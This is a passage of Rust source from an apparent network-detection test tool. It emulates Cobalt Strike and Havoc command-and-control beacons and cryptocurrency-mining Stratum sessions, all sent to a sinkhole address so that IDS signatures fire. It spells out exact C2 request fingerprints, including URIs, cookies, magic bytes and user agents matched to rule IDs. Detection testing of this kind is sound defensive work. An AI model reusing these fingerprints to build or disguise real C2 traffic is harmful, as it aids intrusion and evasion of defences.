                            log,
                            "Mode: Cobalt Strike 6-pattern sequence (port 4444)"
                        )
                        .unwrap();
                        let cs_base = format!("http://{}:4444", sinkhole_ip);
                        let cs_host = format!("Host: {}", profile.domain);
                        let cs_uuid = Uuid::new_v4().to_string();
                        let cs_b64_data = B64.encode(cs_uuid.as_bytes());
                        let mut cs_any_ok = false;

                        // Helper: run one curl request, return true if sent/ok
                        macro_rules! cs_curl {
                            ($args:expr, $label:expr) => {{
                                writeln!(
                                    log,
                                    "CS {}: curl {}",
                                    $label,
                                    $args.join(" ")
                                )
                                .unwrap();
                                match Command::new("curl")
                                    .args(&$args)
                                    .output()
                                    .await
                                {
                                    Ok(output) => {
                                        let res = String::from_utf8_lossy(
                                            &output.stdout,
                                        );
                                        let ec = output
                                            .status
                                            .code()
                                            .unwrap_or(-1);
                                        if is_fallback {
                                            writeln!(
                                                log,
                                                "CS {}: SENT (fallback)",
                                                $label
                                            )
                                            .unwrap();
                                        } else if ec == 0 {
                                            if !cs_any_ok {
                                                successful_connections += 1;
                                                cs_any_ok = true;
                                            }
                                            writeln!(
                                                log,
                                                "CS {}: SUCCESS ({})",
                                                $label,
                                                res.trim()
                                            )
                                            .unwrap();
                                        } else {
                                            writeln!(
                                                log,
                                                "CS {}: FAILED (ec={})",
                                                $label, ec
                                            )
                                            .unwrap();
                                        }
                                    }
                                    Err(e) => {
                                        writeln!(
                                            log,
                                            "CS {}: ERROR ({})",
                                            $label, e
                                        )
                                        .unwrap();
                                    }
                                }
                            }};
                        }

                        // 1) sid:63772 -- /get + auth_token[A-Z]{2}[0-9]{2}=[A-Z]{32} cookie
                        //    (MSIE 9.0 BOIE9 UA matches the profile.user_agent)
                        let cs1_args: Vec<String> = vec![
                            "-s".to_string(), "-o".to_string(), "/dev/null".to_string(),
                            "-w".to_string(), "%{http_code},%{time_total}".to_string(),
                            "--max-time".to_string(), timeout.to_string(),
                            "--connect-timeout".to_string(), timeout.to_string(),
                            "-X".to_string(), "GET".to_string(),
                            "-A".to_string(), profile.user_agent.to_string(),
                            "-H".to_string(), cs_host.clone(),
                            "-H".to_string(),
                            "Cookie: auth_tokenAB01=ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEF"
                                .to_string(),
                            format!("{}/get", cs_base),
                        ];
                        cs_curl!(cs1_args, "sid63772");

                        // 2) sid:65446 -- /oscp/<path>, Chrome/88.0.4324.104 UA,
                        //    no Accept-Encoding, no Accept-Language
                        let cs2_args: Vec<String> = vec![
                            "-s".to_string(), "-o".to_string(), "/dev/null".to_string(),
                            "-w".to_string(), "%{http_code},%{time_total}".to_string(),
                            "--max-time".to_string(), timeout.to_string(),
                            "--connect-timeout".to_string(), timeout.to_string(),
                            "-X".to_string(), "GET".to_string(),
                            "-A".to_string(),
                            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) \
                             AppleWebKit/537.36 (KHTML, like Gecko) \
                             Chrome/88.0.4324.104 Safari/537.36"
                                .to_string(),
                            "-H".to_string(), cs_host.clone(),
                            "-H".to_string(), "Accept-Encoding:".to_string(),
                            "-H".to_string(), "Accept-Language:".to_string(),
                            format!("{}/oscp/beacon", cs_base),
                        ];
                        cs_curl!(cs2_args, "sid65446");

                        // 3) sid:300048 -- POST /submit.php?id=1,
                        //    Content-Type: application/octet-stream,
                        //    body: 4-byte little-endian length prefix (4) + 4 data bytes = 8 bytes
                        let cs_submit_body: Vec<u8> =
                            vec![0x04, 0x00, 0x00, 0x00,
                                 0x41, 0x41, 0x41, 0x41];
                        let cs3_args_result = tempfile::NamedTempFile::new()
                            .ok()
                            .and_then(|mut tf| {
                                if tf.write_all(&cs_submit_body).is_ok() {
                                    let p = tf
                                        .path()
                                        .to_string_lossy()
                                        .to_string();
                                    let args: Vec<String> = vec![
                                        "-s".to_string(),
                                        "-o".to_string(),
                                        "/dev/null".to_string(),
                                        "-w".to_string(),
                                        "%{http_code},%{time_total}"
                                            .to_string(),
                                        "--max-time".to_string(),
                                        timeout.to_string(),
                                        "--connect-timeout".to_string(),
                                        timeout.to_string(),
                                        "-X".to_string(),
                                        "POST".to_string(),
                                        "-A".to_string(),
                                        profile.user_agent.to_string(),
                                        "-H".to_string(),
                                        cs_host.clone(),
                                        "-H".to_string(),
                                        "Content-Type: application/octet-stream"
                                            .to_string(),
                                        "-d".to_string(),
                                        format!("@{}", p),
                                        format!(
                                            "{}/submit.php?id=1",
                                            cs_base
                                        ),
                                    ];
                                    Some((args, tf))
                                } else {
                                    None
                                }
                            });
                        // _tf kept alive in the binding so the temp file
                        // remains on disk while curl reads it via @<path>
                        if let Some((args, _tf)) = cs3_args_result {
                            cs_curl!(args, "sid300048");
                        }

                        // 4) sid:54175 -- raw URI exactly "/mPlayer" (8 chars)
                        let cs4_args: Vec<String> = vec![
                            "-s".to_string(), "-o".to_string(), "/dev/null".to_string(),
                            "-w".to_string(), "%{http_code},%{time_total}".to_string(),
                            "--max-time".to_string(), timeout.to_string(),
                            "--connect-timeout".to_string(), timeout.to_string(),
                            "-X".to_string(), "GET".to_string(),
                            "-A".to_string(), profile.user_agent.to_string(),
                            "-H".to_string(), cs_host.clone(),
                            format!("{}/mPlayer", cs_base),
                        ];
                        cs_curl!(cs4_args, "sid54175");

                        // 5) sid:54182 -- GET /compatible?id=<uuid> (check-in),
                        //    then POST /compatible?id=<uuid> with body "data=<b64>&from=0"
                        //    (stage-2 fetch); both requests target the same URI.
                        let cs5_get_args: Vec<String> = vec![
                            "-s".to_string(), "-o".to_string(), "/dev/null".to_string(),
                            "-w".to_string(), "%{http_code},%{time_total}".to_string(),
                            "--max-time".to_string(), timeout.to_string(),
                            "--connect-timeout".to_string(), timeout.to_string(),
                            "-X".to_string(), "GET".to_string(),
                            "-A".to_string(), profile.user_agent.to_string(),
                            "-H".to_string(), cs_host.clone(),
                            format!("{}/compatible?id={}", cs_base, cs_uuid),
                        ];
                        cs_curl!(cs5_get_args, "sid54182-GET");

                        let cs5_body = format!("data={}&from=0", cs_b64_data).into_bytes();
                        let cs5_args_result = tempfile::NamedTempFile::new()
                            .ok()
                            .and_then(|mut tf| {
                                if tf.write_all(&cs5_body).is_ok() {
                                    let p = tf
                                        .path()
                                        .to_string_lossy()
                                        .to_string();
                                    let args: Vec<String> = vec![
                                        "-s".to_string(),
                                        "-o".to_string(),
                                        "/dev/null".to_string(),
                                        "-w".to_string(),
                                        "%{http_code},%{time_total}"
                                            .to_string(),
                                        "--max-time".to_string(),
                                        timeout.to_string(),
                                        "--connect-timeout".to_string(),
                                        timeout.to_string(),
                                        "-X".to_string(),
                                        "POST".to_string(),
                                        "-A".to_string(),
                                        profile.user_agent.to_string(),
                                        "-H".to_string(),
                                        cs_host.clone(),
                                        "-d".to_string(),
                                        format!("@{}", p),
                                        format!(
                                            "{}/compatible?id={}",
                                            cs_base, cs_uuid
                                        ),
                                    ];
                                    Some((args, tf))
                                } else {
                                    None
                                }
                            });
                        if let Some((args, _tf)) = cs5_args_result {
                            cs_curl!(args, "sid54182-POST");
                        }

                        // 6) sid:56616 -- POST /track, JSON body containing
                        //    "locale":"en", "channel":"prod", "cli", "l-"
                        let cs6_body = format!(
                            "{{\"locale\":\"en\",\"channel\":\"prod\",\
                              \"addon\":\"{}\",\"cli\":\"x\",\"l-monitor\":\"y\"}}",
                            cs_uuid
                        )
                        .into_bytes();
                        let cs6_args_result = tempfile::NamedTempFile::new()
                            .ok()
                            .and_then(|mut tf| {
                                if tf.write_all(&cs6_body).is_ok() {
                                    let p = tf
                                        .path()
                                        .to_string_lossy()
                                        .to_string();
                                    let args: Vec<String> = vec![
                                        "-s".to_string(),
                                        "-o".to_string(),
                                        "/dev/null".to_string(),
                                        "-w".to_string(),
                                        "%{http_code},%{time_total}"
                                            .to_string(),
                                        "--max-time".to_string(),
                                        timeout.to_string(),
                                        "--connect-timeout".to_string(),
                                        timeout.to_string(),
                                        "-X".to_string(),
                                        "POST".to_string(),
                                        "-A".to_string(),
                                        profile.user_agent.to_string(),
                                        "-H".to_string(),
                                        cs_host.clone(),
                                        "-H".to_string(),
                                        "Content-Type: application/json"
                                            .to_string(),
                                        "-d".to_string(),
                                        format!("@{}", p),
                                        format!("{}/track", cs_base),
                                    ];
                                    Some((args, tf))
                                } else {
                                    None
                                }
                            });
                        if let Some((args, _tf)) = cs6_args_result {
                            cs_curl!(args, "sid56616");
                        }

                        if is_fallback {
                            println!(
                                "  [-->] Cobalt Strike 6-pattern sequence sent (fallback)"
                            );
                        } else if cs_any_ok {
                            println!(
                                "  [OK] Cobalt Strike 6-pattern sequence complete"
                            );
                        } else {
                            println!(
                                "  [--] Cobalt Strike 6-pattern sequence failed"
                            );
                        }
                        sleep(Duration::from_secs(2)).await;
                    } else if profile.domain == "signalbench-havoc.cc" {
                        // Havoc: 3-request sequence.
                        // 1) GET jquery masquerading URI (Havoc HTTP profile fingerprint)
                        // 2) POST /Collectors/ with DE AD BE EF magic bytes at offset 4
                        // 3) POST with B1 6B 00 B5 magic bytes at offset 4
                        // snort3-malware-cnc.rules Havoc teamserver magic byte rules.
                        println!(
                            "[T1071-IOC]   Framework: {} (3-request sequence on port 4444)",
                            profile.framework
                        );
                        writeln!(
                            log,
                            "Mode: Havoc 3-request sequence (port 4444)"
                        )
                        .unwrap();
                        let havoc_base = format!("http://{}:4444", sinkhole_ip);
                        let havoc_host = format!("Host: {}", profile.domain);
                        let havoc_rand =
                            Uuid::new_v4().to_string().replace('-', "");
                        let mut havoc_any_ok = false;

                        // 1) GET jquery-3.6.4.min.js (Havoc HTTP masquerading fingerprint)
                        let hav1_args: Vec<String> = vec![
                            "-s".to_string(), "-o".to_string(), "/dev/null".to_string(),
                            "-w".to_string(), "%{http_code},%{time_total}".to_string(),
                            "--max-time".to_string(), timeout.to_string(),
                            "--connect-timeout".to_string(), timeout.to_string(),
                            "-X".to_string(), "GET".to_string(),
                            "-A".to_string(), profile.user_agent.to_string(),
                            "-H".to_string(), havoc_host.clone(),
                            "-H".to_string(), "Server: Apache".to_string(),
                            format!(
                                "{}/js/jquery-3.6.4.min.js?id={}&hash={}",
                                havoc_base,
                                &havoc_rand[..8],
                                &havoc_rand[8..16]
                            ),
                        ];
                        writeln!(log, "Havoc req 1/3: GET /js/jquery").unwrap();
                        match Command::new("curl").args(&hav1_args).output().await {
                            Ok(output) => {
                                let ec = output.status.code().unwrap_or(-1);
                                if is_fallback {
                                    writeln!(log, "Havoc 1/3: SENT (fallback)").unwrap();
                                } else if ec == 0 {
                                    if !havoc_any_ok {
                                        successful_connections += 1;
                                        havoc_any_ok = true;
                                    }
                                    writeln!(log, "Havoc 1/3: SUCCESS").unwrap();
                                } else {
                                    writeln!(log, "Havoc 1/3: FAILED (ec={})", ec).unwrap();
                                }
                            }
                            Err(e) => {
                                writeln!(log, "Havoc 1/3: ERROR ({})", e).unwrap();
                            }
                        }

                        // Body for requests 2 and 3:
                        // bytes 0-3: big-endian(body_len - 4) = 0x0000000C (body_len=16)
                        // bytes 4-7: magic bytes (DEADBEEF or B16B00B5)
                        // bytes 8-11: 0x00000020 (byte 11 = 0x20 != 0x00; value in [2, 0x80000000])
                        // bytes 12-15: 0x00000001 (value <= 0x66)
                        // Content-Length: 16 (auto-set by curl); byte_math: 16 - 4 = 12 = body[0..4]

                        let havoc_body_deadbeef: Vec<u8> = vec![
                            0x00, 0x00, 0x00, 0x0C,
                            0xDE, 0xAD, 0xBE, 0xEF,
                            0x00, 0x00, 0x00, 0x20,
                            0x00, 0x00, 0x00, 0x01,
                        ];
                        let havoc_body_b16b00b5: Vec<u8> = vec![
                            0x00, 0x00, 0x00, 0x0C,
                            0xB1, 0x6B, 0x00, 0xB5,
                            0x00, 0x00, 0x00, 0x20,
                            0x00, 0x00, 0x00, 0x01,
                        ];

                        // 2) POST /Collectors/3.0/settings/mail/ with DEADBEEF magic bytes
                        if let Ok(mut tf) = tempfile::NamedTempFile::new() {
                            if tf.write_all(&havoc_body_deadbeef).is_ok() {
                                let p = tf.path().to_string_lossy().to_string();
                                let hav2_args: Vec<String> = vec![
                                    "-s".to_string(), "-o".to_string(), "/dev/null".to_string(),
                                    "-w".to_string(), "%{http_code},%{time_total}".to_string(),
                                    "--max-time".to_string(), timeout.to_string(),
                                    "--connect-timeout".to_string(), timeout.to_string(),
                                    "-X".to_string(), "POST".to_string(),
                                    "-A".to_string(), profile.user_agent.to_string(),
                                    "-H".to_string(), havoc_host.clone(),
                                    "-H".to_string(), "Content-Type: application/octet-stream".to_string(),
                                    "-d".to_string(), format!("@{}", p),
                                    format!(
                                        "{}/Collectors/3.0/settings/mail/",
                                        havoc_base
                                    ),
                                ];
                                writeln!(log, "Havoc req 2/3: POST /Collectors/ (DEADBEEF)").unwrap();
                                match Command::new("curl").args(&hav2_args).output().await {
                                    Ok(output) => {
                                        let ec = output.status.code().unwrap_or(-1);
                                        if is_fallback {
                                            writeln!(log, "Havoc 2/3: SENT (fallback)").unwrap();
                                        } else if ec == 0 {
                                            if !havoc_any_ok {
                                                successful_connections += 1;
                                                havoc_any_ok = true;
                                            }
                                            writeln!(log, "Havoc 2/3: SUCCESS").unwrap();
                                        } else {
                                            writeln!(log, "Havoc 2/3: FAILED (ec={})", ec).unwrap();
                                        }
                                    }
                                    Err(e) => {
                                        writeln!(log, "Havoc 2/3: ERROR ({})", e).unwrap();
                                    }
                                }
                                drop(tf);
                            }
                        }

                        // 3) POST with B16B00B5 magic bytes
                        if let Ok(mut tf) = tempfile::NamedTempFile::new() {
                            if tf.write_all(&havoc_body_b16b00b5).is_ok() {
                                let p = tf.path().to_string_lossy().to_string();
                                let hav3_args: Vec<String> = vec![
                                    "-s".to_string(), "-o".to_string(), "/dev/null".to_string(),
                                    "-w".to_string(), "%{http_code},%{time_total}".to_string(),
                                    "--max-time".to_string(), timeout.to_string(),
                                    "--connect-timeout".to_string(), timeout.to_string(),
                                    "-X".to_string(), "POST".to_string(),
                                    "-A".to_string(), profile.user_agent.to_string(),
                                    "-H".to_string(), havoc_host.clone(),
                                    "-H".to_string(), "Content-Type: application/octet-stream".to_string(),
                                    "-d".to_string(), format!("@{}", p),
                                    format!(
                                        "{}/Collectors/3.0/events/mail/",
                                        havoc_base
                                    ),
                                ];
                                writeln!(log, "Havoc req 3/3: POST /Collectors/ (B16B00B5)").unwrap();
                                match Command::new("curl").args(&hav3_args).output().await {
                                    Ok(output) => {
                                        let ec = output.status.code().unwrap_or(-1);
                                        if is_fallback {
                                            writeln!(log, "Havoc 3/3: SENT (fallback)").unwrap();
                                        } else if ec == 0 {
                                            if !havoc_any_ok {
                                                successful_connections += 1;
                                                havoc_any_ok = true;
                                            }
                                            writeln!(log, "Havoc 3/3: SUCCESS").unwrap();
                                        } else {
                                            writeln!(log, "Havoc 3/3: FAILED (ec={})", ec).unwrap();
                                        }
                                    }
                                    Err(e) => {
                                        writeln!(log, "Havoc 3/3: ERROR ({})", e).unwrap();
                                    }
                                }
                                drop(tf);
                            }
                        }

                        if is_fallback {
                            println!(
                                "  [-->] Havoc 3-request sequence sent (fallback)"
                            );
                        } else if havoc_any_ok {
                            println!("  [OK] Havoc 3-request sequence complete");
                        } else {
                            println!("  [--] Havoc 3-request sequence failed");
                        }
                        sleep(Duration::from_secs(2)).await;
                    } else {
                        // Standard C2 framework profile: primary on port 4444, follow-up on
                        // port 80.  Binary bodies written to a temp file so null bytes and
                        // arbitrary byte sequences survive execve intact.
                        println!(
                            "[T1071-IOC]   Framework: {} (C2 profile, port 4444)",
                            profile.framework
                        );
                        writeln!(
                            log,
                            "Mode: C2 profile (port 4444 primary, port 80 follow-up)"
                        )
                        .unwrap();

                        // Primary request
                        let primary_url =
                            format!("http://{}:4444{}", sinkhole_ip, profile.uri);
                        let mut primary_args: Vec<String> = vec![
                            "-s".to_string(),
                            "-o".to_string(),
                            "/dev/null".to_string(),
                            "-w".to_string(),
                            "%{http_code},%{time_total},%{remote_ip}".to_string(),
                            "--max-time".to_string(),
                            timeout.to_string(),
                            "--connect-timeout".to_string(),
                            timeout.to_string(),
                            "-A".to_string(),
                            profile.user_agent.to_string(),
                            "-X".to_string(),
                            profile.method.to_string(),
                            "-H".to_string(),
                            format!("Host: {}", profile.domain),
                        ];
                        for hdr in &profile.extra_headers {
                            primary_args.push("-H".to_string());
                            primary_args.push(hdr.clone());
                        }
                        // Binary-safe body: write bytes to temp file, pass -d @<path>.
                        // Keeps null bytes and arbitrary byte sequences intact through execve.
                        let primary_body_tf: Option<tempfile::NamedTempFile>;
                        if let Some(body_bytes) = &profile.body {
                            match tempfile::NamedTempFile::new() {
                                Ok(mut tf) => {
                                    if tf.write_all(body_bytes).is_ok() {
                                        let path =
                                            tf.path().to_string_lossy().to_string();
                                        primary_args.push("-d".to_string());
                                        primary_args.push(format!("@{}", path));
                                        primary_body_tf = Some(tf);
                                    } else {
                                        primary_body_tf = None;
                                    }
                                }
                                Err(_) => {
                                    primary_body_tf = None;
                                }
                            }
                        } else {
                            primary_body_tf = None;
                        }
                        primary_args.push(primary_url);
                        writeln!(log, "Primary curl: curl {}", primary_args.join(" "))
                            .unwrap();

                        match Command::new("curl").args(&primary_args).output().await {
                            Ok(output) => {
                                let result = String::from_utf8_lossy(&output.stdout);
                                let exit_code = output.status.code().unwrap_or(-1);
                                if is_fallback {
                                    println!("  [-->] Sent (fallback unidirectional)");
                                    writeln!(
                                        log,
                                        "Primary status: SENT unidirectional (fallback mode)"
                                    )
                                    .unwrap();
                                } else if exit_code == 0 {
                                    successful_connections += 1;
                                    println!("  [OK] Response: {}", result.trim());
                                    writeln!(log, "Primary status: SUCCESS").unwrap();
                                    writeln!(log, "Primary response: {}", result).unwrap();
                                } else {
                                    println!("  [--] Failed (exit code: {})", exit_code);
                                    writeln!(
                                        log,
                                        "Primary status: FAILED (exit code: {})",
                                        exit_code
                                    )
                                    .unwrap();
                                }
                            }
                            Err(e) => {
                                println!("  [FAIL] Error: {}", e);
                                writeln!(log, "Primary status: ERROR ({})", e).unwrap();
                            }
                        }
                        drop(primary_body_tf);

                        // Follow-up request on port 80.  Sent in both normal and
                        // fallback mode; in fallback the result is not interpreted
                        // (fire-and-forget, matching the primary request behaviour).
                        if let (Some(followup_uri), Some(followup_method)) =
                            (&profile.followup_uri, profile.followup_method)
                        {
                            let followup_url =
                                format!("http://{}:80{}", sinkhole_ip, followup_uri);
                            let mut followup_args: Vec<String> = vec![
                                "-s".to_string(),
                                "-o".to_string(),
                                "/dev/null".to_string(),
                                "-w".to_string(),
                                "%{http_code},%{time_total},%{remote_ip}".to_string(),
                                "--max-time".to_string(),
                                timeout.to_string(),
                                "--connect-timeout".to_string(),
                                timeout.to_string(),
                                "-A".to_string(),
                                profile.user_agent.to_string(),
                                "-X".to_string(),
                                followup_method.to_string(),
                                "-H".to_string(),
                                format!("Host: {}", profile.domain),
                            ];
                            for hdr in &profile.followup_extra_headers {
                                followup_args.push("-H".to_string());
                                followup_args.push(hdr.clone());
                            }
                            let followup_body_tf: Option<tempfile::NamedTempFile>;
                            if let Some(body_bytes) = &profile.followup_body {
                                match tempfile::NamedTempFile::new() {
                                    Ok(mut tf) => {
                                        if tf.write_all(body_bytes).is_ok() {
                                            let path =
                                                tf.path().to_string_lossy().to_string();
                                            followup_args.push("-d".to_string());
                                            followup_args.push(format!("@{}", path));
                                            followup_body_tf = Some(tf);
                                        } else {
                                            followup_body_tf = None;
                                        }
                                    }
                                    Err(_) => {
                                        followup_body_tf = None;
                                    }
                                }
                            } else {
                                followup_body_tf = None;
                            }
                            followup_args.push(followup_url);
                            writeln!(
                                log,
                                "Follow-up curl: curl {}",
                                followup_args.join(" ")
                            )
                            .unwrap();

                            match Command::new("curl")
                                .args(&followup_args)
                                .output()
                                .await
                            {
                                Ok(output) => {
                                    let result =
                                        String::from_utf8_lossy(&output.stdout);
                                    let exit_code =
                                        output.status.code().unwrap_or(-1);
                                    if is_fallback {
                                        writeln!(
                                            log,
                                            "Follow-up status: SENT unidirectional (fallback mode)"
                                        )
                                        .unwrap();
                                    } else if exit_code == 0 {
                                        writeln!(
                                            log,
                                            "Follow-up status: SUCCESS"
                                        )
                                        .unwrap();
                                        writeln!(
                                            log,
                                            "Follow-up response: {}",
                                            result
                                        )
                                        .unwrap();
                                    } else {
                                        writeln!(
                                            log,
                                            "Follow-up status: FAILED (exit code: {})",
                                            exit_code
                                        )
                                        .unwrap();
                                    }
                                }
                                Err(e) => {
                                    writeln!(
                                        log,
                                        "Follow-up status: ERROR ({})",
                                        e
                                    )
                                    .unwrap();
                                }
                            }
                            drop(followup_body_tf);
                        }
                    }
                } else {
                    // Plain curl for DGA, IP address, Tor-proxy, and mining-pool domains.
                    // These do not get a C2 framework profile overlay.
                    let curl_result = Command::new("curl")
                        .args([
                            "-s",
                            "-o",
                            "/dev/null",
                            "-w",
                            "%{http_code},%{time_total},%{remote_ip}",
                            "--max-time",
                            &timeout.to_string(),
                            "--connect-timeout",
                            &timeout.to_string(),
                            &format!("http://{}", domain),
                        ])
                        .output()
                        .await;

                    match curl_result {
                        Ok(output) => {
                            let result = String::from_utf8_lossy(&output.stdout);
                            let exit_code = output.status.code().unwrap_or(-1);
                            if exit_code == 0 {
                                successful_connections += 1;
                                println!("  [OK] Response: {}", result.trim());
                                writeln!(log, "Status: SUCCESS").unwrap();
                                writeln!(log, "Response: {}", result).unwrap();
                            } else {
                                println!("  [--] Failed (exit code: {})", exit_code);
                                writeln!(
                                    log,
                                    "Status: FAILED (exit code: {})",
                                    exit_code
                                )
                                .unwrap();
                            }
                        }
                        Err(e) => {
                            println!("  [FAIL] Error: {}", e);
                            writeln!(log, "Status: ERROR ({})", e).unwrap();
                        }
                    }
                }

                // DNS lookup for additional telemetry (all domains). Prefer dig
                // for the process + query telemetry; when dig is absent fall back
                // to the system resolver (tokio::net::lookup_host) so the DNS
                // query — the actual signal — still leaves the host instead of
                // the lookup silently producing nothing.
                if dig_available {
                    let dig_result = Command::new("dig")
                        .args(["+short", "+time=1", "+tries=1", domain])
                        .output()
                        .await;

                    if let Ok(output) = dig_result {
                        let dns_result = String::from_utf8_lossy(&output.stdout);
                        if !dns_result.trim().is_empty() {
                            writeln!(log, "DNS: {}", dns_result.trim()).unwrap();
                        } else {
                            writeln!(log, "DNS: No resolution").unwrap();
                        }
                    }
                } else {
                    match tokio::net::lookup_host(format!("{domain}:0")).await {
                        Ok(addrs) => {
                            let ips: Vec<String> = addrs.map(|a| a.ip().to_string()).collect();
                            if ips.is_empty() {
                                writeln!(log, "DNS: No resolution (native resolver, dig absent)")
                                    .unwrap();
                            } else {
                                writeln!(
                                    log,
                                    "DNS: {} (native resolver, dig absent)",
                                    ips.join(" ")
                                )
                                .unwrap();
                            }
                        }
                        Err(e) => {
                            writeln!(log, "DNS: lookup failed (native resolver, dig absent): {e}")
                                .unwrap();
                        }
                    }
                }

                writeln!(log).unwrap();
            }

            // Print warning for skipped domains
            print_skipped_domains_warning(&skipped_domains, &sinkhole_ip);

            // =================================================================
            // Phase 2: Stratum Protocol Simulation
            // =================================================================
            // Initiates real TCP connections to mining pool hosts on ports 3333
            // and 4444, sending the Stratum JSON-RPC handshake. The Palo Alto
            // App-ID engine classifies this traffic as stratum-mining regardless
            // of whether the remote host responds. Connection target resolves via
            // /etc/hosts to sinkhole_ip (resolved from SINKHOLE_LOOKUP_DOMAIN,
            // falling back to 198.135.184.22); non-root falls back to direct IP.

            println!("\n[T1071-IOC] Phase 2: Stratum Protocol Simulation");
            println!("{}", "-".repeat(60));
            println!("{:<50} OUTCOME", "TARGET");
            println!("{}", "-".repeat(60));

            writeln!(log, "\n=== Phase 2: Stratum Protocol Simulation ===").unwrap();
            writeln!(log, "Ports: 3333, 4444").unwrap();
            writeln!(log, "Protocol: Stratum JSON-RPC (cleartext TCP)").unwrap();
            writeln!(log).unwrap();

            let mut stratum_attempts: u32 = 0;
            let mut stratum_connected: u32 = 0;

            for &domain in STRATUM_MINING_DOMAINS {
                // Always verify the domain resolves to sinkhole_ip before
                // connecting, regardless of root status. If /etc/hosts was not
                // written or the system resolver bypasses it, fall back to
                // dialling sinkhole_ip directly so we never reach a real pool.
                let resolved_to_safe = domain_resolves_to_safe_ip(domain, &sinkhole_ip).await;
                if !resolved_to_safe && running_as_root {
                    warn!(
                        "[T1071-IOC] [WARN] {} did not resolve to {} via /etc/hosts - using sinkhole IP directly",
                        domain, sinkhole_ip
                    );
                }
                let connect_host = if resolved_to_safe {
                    domain.to_string()
                } else {
                    sinkhole_ip.clone()
                };
                let via_note = if resolved_to_safe {
                    format!("via /etc/hosts -> {}", sinkhole_ip)
                } else {
                    format!("direct {}", sinkhole_ip)
                };

                for &port in STRATUM_PORTS {
                    stratum_attempts += 1;
                    let addr = format!("{}:{}", connect_host, port);
                    let display = format!("{}:{}", domain, port);

                    debug!("[T1071-IOC] Stratum TCP connect: {} ({})", addr, via_note);
                    print!("  {:<48} ", display);

                    writeln!(log, "--- {} ({}) ---", display, via_note).unwrap();
                    writeln!(log, "Time: {}", chrono::Local::now()).unwrap();

                    match async_timeout(Duration::from_secs(3), TcpStream::connect(&addr)).await {
                        Ok(Ok(stream)) => {
                            stratum_connected += 1;
                            println!("CONNECTED [{}]", via_note);
                            writeln!(log, "TCP: CONNECTED").unwrap();

                            let session_start = std::time::Instant::now();
                            let (read_half, mut write_half) = stream.into_split();
                            let mut reader = BufReader::new(read_half);

                            // ---- Phase: mining.subscribe ----
                            // Send subscribe; server responds with subscribe result +
                            // mining.set_difficulty + mining.notify (first job).
                            match async_timeout(
                                Duration::from_secs(2),
                                write_half.write_all(STRATUM_SUBSCRIBE.as_bytes()),
                            )
                            .await
                            {
                                Ok(Ok(())) => {
                                    debug!(
                                        "[T1071-IOC] Stratum mining.subscribe sent to {}",
                                        addr
                                    );
                                    writeln!(log, "Sent: mining.subscribe").unwrap();
                                }
                                Ok(Err(e)) => {
                                    writeln!(
                                        log,
                                        "Sent: mining.subscribe (write error: {})",
                                        e
                                    )
                                    .unwrap();
                                }
                                Err(_) => {
                                    writeln!(log, "Sent: mining.subscribe (write timeout)")
                                        .unwrap();
                                }
                            }

                            // Read subscribe result + set_difficulty + notify (up to 5 lines)
                            let sub_lines = read_stratum_lines(&mut reader, 2, 5).await;
                            let mut job_id = "sb00".to_string();
                            for line in &sub_lines {
                                writeln!(log, "Recv: {}", line).unwrap();
                                debug!("[T1071-IOC] Stratum recv: {}", line);
                            }
                            if let Some(id) = extract_notify_job_id(&sub_lines) {
                                debug!(
                                    "[T1071-IOC] Stratum job_id from subscribe notify: {}",
                                    id
                                );
                                job_id = id;
                            }

                            // ---- Phase: mining.authorize ----
                            // Server responds with authorize result + updated set_difficulty +
                            // mining.notify + optional client.get_version request.
                            match async_timeout(
                                Duration::from_secs(2),
                                write_half.write_all(STRATUM_AUTHORIZE.as_bytes()),
                            )
                            .await
                            {
                                Ok(Ok(())) => {
                                    debug!(
                                        "[T1071-IOC] Stratum mining.authorize sent to {}",
                                        addr
                                    );
                                    writeln!(log, "Sent: mining.authorize").unwrap();
                                }
                                Ok(Err(e)) => {
                                    writeln!(
                                        log,
                                        "Sent: mining.authorize (write error: {})",
                                        e
                                    )
                                    .unwrap();
                                }
                                Err(_) => {
                                    writeln!(log, "Sent: mining.authorize (write timeout)")
                                        .unwrap();
                                }
                            }

                            // Read authorize result + set_difficulty + notify + client.get_version
                            let auth_lines = read_stratum_lines(&mut reader, 2, 6).await;
                            let mut saw_version_req = false;
                            for line in &auth_lines {
                                writeln!(log, "Recv: {}", line).unwrap();
                                debug!("[T1071-IOC] Stratum recv: {}", line);
                                if line.contains("\"client.get_version\"") {
                                    saw_version_req = true;
                                }
                            }
                            if let Some(id) = extract_notify_job_id(&auth_lines) {
                                debug!(
                                    "[T1071-IOC] Stratum job_id from auth notify: {}",
                                    id
                                );
                                job_id = id;
                            }

                            // Respond to client.get_version if the server requested it.
                            // Our server always sends id=4; use the pre-formatted constant.
                            if saw_version_req {
                                match async_timeout(
                                    Duration::from_secs(2),
                                    write_half.write_all(
                                        STRATUM_CLIENT_VERSION_RESPONSE.as_bytes(),
                                    ),
                                )
                                .await
                                {
                                    Ok(Ok(())) => {
                                        debug!(
                                            "[T1071-IOC] Stratum client.get_version response sent"
                                        );
                                        writeln!(
                                            log,
                                            "Sent: client.get_version response"
                                        )
                                        .unwrap();
                                    }
                                    Ok(Err(e)) => {
                                        writeln!(
                                            log,
                                            "Sent: client.get_version (write error: {})",
                                            e
                                        )
                                        .unwrap();
                                    }
                                    Err(_) => {
                                        writeln!(
                                            log,
                                            "Sent: client.get_version (write timeout)"
                                        )
                                        .unwrap();
                                    }
                                }
                            }

                            // ---- Phase: 4-round submit loop ----
                            // Each round: client sends mining.submit (using current job_id
                            // and an incrementing nonce), server responds with accepted result
                            // + new mining.notify (next job_id). Client updates job_id from
                            // the notify and waits ~1 second before the next round.
                            // Four rounds at ~1 s each = ~4 s of continuous bidirectional
                            // traffic — plus the handshake — ensuring >= 5 s total dwell.
                            for round in 0u32..4 {
                                let submit_id = round + 3;
                                let nonce = (round + 1) * 0x0001_0000u32;
                                let submit_msg =
                                    make_stratum_submit(submit_id, &job_id, nonce);
                                match async_timeout(
                                    Duration::from_secs(2),
                                    write_half.write_all(submit_msg.as_bytes()),
                                )
                                .await
                                {
                                    Ok(Ok(())) => {
                                        debug!(
                                            "[T1071-IOC] Stratum mining.submit round {} sent (job={}, nonce={:08x})",
                                            round + 1,
                                            job_id,
                                            nonce
                                        );
                                        writeln!(
                                            log,
                                            "Sent: mining.submit round {} (job={}, nonce={:08x})",
                                            round + 1,
                                            job_id,
                                            nonce
                                        )
                                        .unwrap();
                                    }
                                    Ok(Err(e)) => {
                                        writeln!(
                                            log,
                                            "Sent: mining.submit round {} (write error: {})",
